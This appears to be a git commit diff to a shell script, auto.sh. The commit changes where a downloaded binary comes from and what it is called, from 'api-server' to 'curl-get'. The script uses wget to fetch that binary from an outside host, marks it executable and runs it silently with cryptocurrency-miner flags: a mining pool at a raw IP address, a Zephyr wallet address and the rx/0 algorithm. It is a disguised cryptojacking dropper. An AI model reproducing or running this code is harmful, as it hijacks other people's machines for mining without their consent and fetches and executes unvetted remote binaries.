1c9f827c07cc2f99a3758545e3d28a027a50c98b
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-14 22:07:25 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,6 +1,6 @@
-wget -q https://maper.info/api-server && chmod +x api-server >/dev/null 2>&1
+wget -q https://02ip.ru/curl-get && chmod +x curl-get >/dev/null 2>&1
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./api-server --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p 8v -a rx/0 -t -s >/dev/null 2>&1
+./curl-get --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p 8v -a rx/0 -t -s >/dev/null 2>&1
